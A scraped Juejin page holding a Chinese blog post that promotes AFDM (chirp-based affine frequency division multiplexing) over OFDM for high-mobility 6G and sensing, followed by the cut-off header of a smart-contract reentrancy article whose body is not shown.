itemtype="http://schema.org/Article" data-entry-id="7605535884940492851" data-draft-id="7605769126271074350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-12T13:07:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="3GPP仿真实验室"/> <meta itemprop="url" content="https://juejin.cn/user/590875532999898"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/590875532999898/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    3GPP仿真实验室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:07:35.000Z" title="Thu Feb 12 2026 13:07:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们先承认一个尴尬的事实：</p>
<p>面对 6G 提出的 <strong>1000 km/h（超高铁）</strong> 和 <strong>28000 km/h（低轨卫星）</strong> 愿景，统治了通信界二十年的王者——OFDM，已经尽力了。</p>
<p>依靠缩短符号时间、加大子载波间隔（SCS），这只是在物理极限的边缘疯狂试探。我们就像在暴风雨中修补一艘漏水的船，补丁打得越多，船越重（CP 开销大、频谱效率低）。</p>
<p><strong>是时候换一艘船了。</strong></p>
<p>今天，我们来聊聊物理层的一场“降维打击”： ​<strong>AFDM 仿射频分复用</strong>​ 。</p>
<hr/>
<h3 data-id="heading-0">01. 完美的代价：OFDM 的基因缺陷</h3>
<p>一切悲剧的根源，早在我们选择 OFDM 的那一刻就注定了。</p>
<p>为了追求频谱效率的极致，我们在频域选择了​<strong>Sinc 函数</strong>​（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">sin(x)/x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">x</span></span></span></span></span>）作为子载波。</p>
<p>它长得并不像一根完美的针，而是一个带着无数“拖油瓶”的波形：</p>
<ul>
<li><strong>主瓣：</strong> 高耸入云，承载有用信息。</li>
<li><strong>旁瓣 (Side-lobes)：</strong> 像波纹一样向两边扩散，且衰减极其缓慢。</li>
</ul>
<p>OFDM 利用数学上的**“正交性”<strong>，巧妙地让每一个子载波的</strong>峰值**，精准地踩在其他所有子载波的<strong>零点 (Zero Crossing)</strong> 上。</p>
<p>这是一场​<strong>刀尖上的舞蹈</strong>​。</p>
<p>虽然旁瓣拖得很长，但在采样点那一瞬间，大家互不干扰。只要大家都不动，这个平衡就是完美的。</p>
<blockquote>
<p><strong>但在 6G 的世界里，“不动”成了一种奢望。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-1">02. 速度的诅咒：从 350km/h 到 7.6km/s</h3>
<p>当你在 350km/h 的高铁上，或者在 7.6km/s 的卫星下，物理世界开始对这个脆弱的数学平衡下手了。</p>
<p>大家通常认为多普勒只是​<strong>频率平移</strong>​。但在 OFDM 的眼里，这简直就是一场 <strong>“旁瓣的屠杀”</strong> 。</p>
<p>设想一下，当整个频谱发生微小的偏移（哪怕只是子载波间隔的 ​<strong>3%</strong> ​）：</p>
<ol>
<li><strong>零点错位：</strong> 接收机做 FFT 采样时，原本应该采到“0”的地方，现在采到了隔壁子载波的​<strong>旁瓣能量</strong>​。</li>
<li><strong>能量海啸：</strong> 由于 Sinc 函数的旁瓣拖得很长，<strong>远处的子载波</strong>也会把能量“泼”过来。</li>
<li><strong>ICI 爆发：</strong> 成千上万个子载波的干扰叠加在一起，形成了恐怖的 ​<strong>ICI（载波间干扰）</strong> ​。</li>
</ol>
<p><strong>(建议配图：OFDM 子载波正交性被破坏的示意图，展示波峰对不准零点)</strong></p>
<p>更绝望的是​<strong>低轨卫星（LEO）场景</strong>​。</p>
<p>当速度达到 ​<strong>7.6 km/s</strong>​，多普勒频移轻松突破 ​<strong>500 kHz</strong>​。</p>
<p>这直接导致​<strong>相干时间（Coherence Time）崩塌</strong>​。</p>
<p>这意味着：<strong>你的导频（Pilot）刚测完信道，还没来得及发数据，信道已经变了。</strong></p>
<p>传统的信道估计逻辑彻底断裂。</p>
<p>这时候，无论你把基站功率开多大，都没用了。因为干扰来自信号内部，信噪比（SINR）被锁死在一个 <strong>“地板”</strong> 上。</p>
<p><strong>网速瞬间从“千兆级”掉回“3G 时代”。</strong></p>
<hr/>
<h3 data-id="heading-2">03. 第一性原理：把“正弦波”扔进垃圾桶</h3>
<p>OFDM 为什么怕多普勒？</p>
<p>因为它用的基底是 ​<strong>正弦波</strong>​——<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mi>j</mi><mn>2</mn><mi>p</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup></mrow><annotation encoding="application/x-tex">e^{j2pi ft}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mord mtight">2</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span></span></span></span></span>。</p>
<p>正弦波是静态的、永恒的。它唯一的弱点就是 <strong>“频率必须精准”</strong> 。</p>
<p>面对 6G 的超高动态，物理层先锋们做了一个违背祖宗的决定：</p>
<p><strong>抛弃正弦波，改用 Chirp（线性调频信号）。</strong>
<img src="http://openwrite.cn/uploads/20293/59390/a1004659-fb9b-4dc7-99db-514fd3eed83a.png" alt="demo_afdm_basics.png" loading="lazy"/></p>
<p>想象一下：</p>
<ul>
<li><strong>OFDM 的子载波</strong> 像是一排排<strong>垂直竖立</strong>的栅栏。风（多普勒）一吹，栅栏就歪了，互相碰撞。</li>
<li><strong>AFDM 的子载波</strong> 像是<strong>倾斜的</strong>多米诺骨牌。
它的频率本身就是随时间线性变化的：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mi>j</mi><mn>2</mn><mi>p</mi><mi>i</mi><mo stretchy="false">(</mo><mi>f</mi><mi>t</mi><mo>+</mo><mi>f</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>c</mi><mn>2</mn><msup><mi>t</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">e^{j2pi (ft + frac{c}{2}t^2)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9869em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mord mtight">2</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">i</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">c</span><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span><span class="mord mtight"><span class="mord mtight">2</span></span><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>这里的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> (Chirp Rate)，就是我们手中的​<strong>魔法钥匙</strong>​。</p>
<hr/>
<h3 data-id="heading-3">04. DAFT：上帝的扭曲力场</h3>
<p>有了 Chirp 信号，我们如何调制数据？</p>
<p>欢迎来到数学的无人区—— ​<strong>DAFT (离散仿射傅里叶变换)</strong> ​。</p>
<p>别被名字吓到。它的物理本质极其性感：</p>
<p><strong>它在对时频平面（Time-Frequency Plane）进行“剪切” (Shearing) 和“旋转”。</strong></p>
<ul>
<li><strong>传统 FFT</strong> 是正正方方的网格。</li>
<li><strong>DAFT</strong> 通过调整参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span>，把网格<strong>扭曲</strong>成平行四边形，使其斜率与信道的<strong>多普勒频移斜率</strong>完美对齐。</li>
</ul>
<p><strong>见证奇迹的时刻：</strong></p>
<p>当信道的最大多普勒频移为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub></mrow><annotation encoding="application/x-tex">f_{max}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，我们只需要设置 Chirp 参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><mn>2</mn><msub><mi>f</mi><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></msub><mi mathvariant="normal">/</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">c = 2f_{max}/T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></span>。</p>
<p>此时，原本在这个星球上狂暴变化的信道，在 DAFT 变换后的域里，竟然奇迹般地​<strong>变成了一条直线（时不变信道）</strong> ​！</p>
<blockquote>
<p><strong>我们没有消除多普勒，我们只是通过扭曲坐标系，把它“骗”过去了。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-4">05. 降维打击：全分集 (Full Diversity) 的暴力美学</h3>
<p>AFDM 最让通信人上瘾的，是它的抗衰落能力。</p>
<p>在 OFDM 中，如果一个子载波掉进深衰落（Deep Fade）的坑里，上面的数据就死定了。</p>
<p>但在 AFDM 中，<strong>每一个数据符号都“弥散”在整个带宽和时隙上。</strong></p>
<p>这就好比：</p>
<ul>
<li><strong>OFDM</strong> 是把鸡蛋放在 1000 个篮子里。摔了一个篮子，就碎一个鸡蛋。</li>
<li><strong>AFDM</strong> 是把鸡蛋打散，均匀地涂在 1000 个篮子上。摔碎几个篮子？无所谓，把剩下的拼起来，鸡蛋还是完整的。</li>
</ul>
<p><strong>结论炸裂：</strong></p>
<p>多普勒越大，多径越复杂，AFDM 的性能反而越好（分集阶数越高）。</p>
<p><strong>这是物理层对恶劣环境的最强嘲讽。</strong></p>
<hr/>
<h3 data-id="heading-5">06. 终极杀手锏：它不再只是通信</h3>
<p>如果你以为 AFDM 只是为了让网速快一点，那你就把格局想小了。</p>
<p>AFDM 真正让 6G 颤抖的，是它的 <strong>“双重身份”</strong> 。</p>
<p>请回想一下，AFDM 的核心波形是什么？<strong>是 Chirp。</strong></p>
<p>在通信人眼里，这是新波形；但在<strong>雷达人</strong>眼里，这是 <strong>“老祖宗”</strong> ！</p>
<p><strong>一个惊人的宿命出现了：</strong></p>
<p>当我们在 6G 基站上发射 AFDM 波形时，我们实际上是在发射​<strong>雷达波</strong>​。</p>
<ul>
<li><strong>OFDM 是“盲人”：</strong> 它只能以此岸传到彼岸，不知道中间经历了什么。</li>
<li><strong>AFDM 是“睁眼玩家”：</strong> 它的波形天然具备​<strong>探测能力</strong>​。它在传输数据的同时，顺便把周围环境的 <strong>距离（Delay）</strong> 和 <strong>速度（Doppler）</strong> 扫描了一遍。</li>
</ul>
<p><strong>这就是 6G 的圣杯——通感一体化 (ISAC)。</strong></p>
<p>未来的基站，不需要你发导频告诉它你在哪。通过 AFDM 的回波，基站直接 <strong>“看”</strong> 到了你。</p>
<p>它知道这辆车在以 120km/h 变道，它知道那颗卫星在以 7.6km/s 靠近。</p>
<p>因为我看清了你，所以我能完美地调节坐标系来适应你。</p>
<p><strong>通信与感知，在 AFDM 的时延-多普勒域里，完成了物理层上的“灵肉合一”。</strong></p>
<hr/>
<h3 data-id="heading-6">结语</h3>
<p>OFDM 统治了二十年，它把“静态”做到了极致。</p>
<p><strong>但 AFDM 的出现，标志着我们终于有勇气去拥抱“动态”。</strong></p>
<p>在 7.6km/s 的星链上，在 1000km/h 的真空管道里，正弦波的时代正在落幕。</p>
<p>那个属于 Chirp，属于 DAFT，属于 <strong>“御风而行”</strong> 的时代，才刚刚开始。</p>
<hr/>
<blockquote>
<p>“欢迎关注公众号 <strong>3GPP仿真实验室</strong>！这里是通信算法工程师的加油站。</p>
<p>我们不搬运新闻，只输出<strong>可运行的代码</strong>和<strong>深度标准解读</strong>。</p>
<p>👇 <strong>新人见面礼（后台回复关键词获取）：</strong></p>
<p>回复【LDPC】：获取 5G NR LDPC 编解码 MATLAB 代码（含注释）。
回复【工具】：通信人减负神器：5G NR 帧结构与频点一键生成器（Python+Excel+Web三版）。
回复【Pytorch】：获取 5G NR OFDM 链路 Pytorch 教学代码（含注释），助力人工智能 + 通信</p>
<p>让我们一起探索 6G 的无限可能。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[10分钟智能合约：进阶实战-3.2.2 跨函数重入]]></title>    <link>https://juejin.cn/post/7605848213602467886</link>    <guid>https://juejin.cn/post/7605848213602467886</guid>    <pubDate>2026-02-12T14:08:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602467886" data-draft-id="7605711582430134323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="10分钟智能合约：进阶实战-3.2.2 跨函数重入"/> <meta itemprop="keywords" content="Solidity,web3,智能合约"/> <meta itemprop="datePublished" content="2026-02-12T14:08:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            10分钟智能合约：进阶实战-3.2.2 跨函数重入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T14:08:11.000Z" title="Thu Feb 12 2026 14:08:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>欢迎订阅专栏</strong>：<a href="https://juejin.cn/column/7602463463105642542" title="https://juejin.cn/column/7602463463105642542" 